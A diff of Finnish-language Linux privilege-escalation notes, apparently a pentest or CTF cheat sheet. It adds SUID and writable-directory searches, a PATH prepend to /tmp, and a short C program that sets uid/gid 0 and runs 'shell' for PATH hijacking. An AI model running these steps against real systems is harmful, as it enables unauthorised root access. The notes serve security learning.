@@ -33,26 +33,39 @@ find / -perm -u=s -type f ## SUID -bittiset tiedostot
 **Kernel-haavoittuvuudet**
 https://www.linuxkernelcves.com/cves
 
-**Sudo-haavoittuvuudet**
-
-**Compile haittaohjelma**
+**SUID-haavoittuvuudet**
+Ohjelmat, joissa SUID-bitti asetettu:
 ```bash
-gcc tiedosto.c -o tiedosto -w
+find / -type f -perm -04000 -ls 2>/dev/null
 ```
+Jos löytyy mielenkiintoisen näköisiä, tarkistetaan täältä:
+https://gtfobins.github.io/
+
 
 **PATH -haavoittuvuudet**
 ```bash
 echo $PATH
 ```
+Kansiot, joihin kirjoitusoikeus:
 ```bash
 find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
-Jos PATH-muuttujassa on kansio, johon käyttäjä pääsee kirjoittamaan, voidaan ko. kansiosta ajaa haittaohjelma root-oikeuksilla.
+```
+Jos PATH-muuttujassa on kansio, johon käyttäjä pääsee kirjoittamaan, voidaan ko. kansiosta ajaa ohjelma root-oikeuksilla.
+
+Kansion lisääminen PATH-muuttujaan:
+```bash
+export PATH=/tmp:$PATH
+```
+Ohjelma etsii PATH-kansioista "shell" -nimistä ohjelmaa:
 
 ```c
 #include<unistd.h>
 void main()
-{ setguid(0);
+{ setuid(0);
   setgid(0);
   system("shell");
 }
+```
+```bash
+gcc .c -o tiedosto -w
 ```
